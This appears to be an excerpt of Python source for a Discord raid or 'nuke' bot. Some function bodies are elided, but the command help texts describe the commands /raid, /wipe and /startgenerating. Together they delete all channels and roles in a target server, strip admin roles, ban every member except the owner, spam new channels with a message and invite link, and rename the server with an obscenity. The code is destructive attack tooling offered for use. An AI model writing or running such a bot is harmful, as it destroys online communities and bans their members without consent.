...
async def list_commands(interaction: discord.Interaction):
    embed = discord.Embed(
        ...
        description="Complete command list with descriptions",
        color=0xff0000,
        timestamp=datetime.datetime.utcnow()
    )
    embed.add_field(
        name="/raid",
        value="`guild_id:str channel_count:int custom_message:str`\nDelete all channels/roles, remove admin roles, ban honeypot, create new channels, send your custom message + invite link in each channel, rename server to 444.",
        inline=False
    )
    embed.add_field(
        name="/wipe",
    ...
    embed.add_field(
        ...
        value="`guild_id:str channel_count:int custom_message:str`\nFull raid: ban honeypot, delete admin roles, delete all channels/roles, rename to FUCKED BY THE 444S, ban all members except owner/bot, create channels with your custom message + invite.",
        inline=False
    )
    embed.add_field(
        name="/removeallbots",
...
# ========== /raid ==========
@bot.tree.command(name="raid", description="Launch raid - delete channels and create new ones with custom message")
async def raid(interaction: discord.Interaction, guild_id: str, channel_count: int, custom_message: str):
    ...
    await interaction.followup.send(f"Done. Created {created} channels with your custom message.")
    await log(interaction, "RAID", guild_id, f"Created {created} channels. Server renamed to 444. Custom message: {custom_message}")
...
# ========== /startgenerating ==========
@bot.tree.command(name="startgenerating", description="Full raid: wipe + ban + create channels with custom message")
async def startgenerating(interaction: discord.Interaction, guild_id: str, channel_count: int, custom_message: str):
    ...
    await interaction.followup.send(f"Full raid done. Banned {banned} members. Created {created} channels with your custom message.")
    await log(interaction, "STARTGENERATING", guild_id, f"Banned {banned} members. Created {created} channels. Server renamed to FUCKED BY THE 444S. Custom message: {custom_message}")
...
async def cmds(ctx):
    ...
    embed.add_field(
        name="/raid",
        value="Deletes all channels/roles, removes admin roles, bans honeypot, creates new channels with your custom message + invite, renames server to 444.",
        inline=False
    )
    embed.add_field(
        name="/wipe",
    ...
    embed.add_field(
        name="/startgenerating",
        value="Full raid: bans honeypot, deletes admin roles, deletes all channels/roles, renames to FUCKED BY THE 444S, bans all members except owner/bot, creates channels with your custom message + invite.",
        inline=False
    )
    embed.add_field(
        name="/removeallbots",
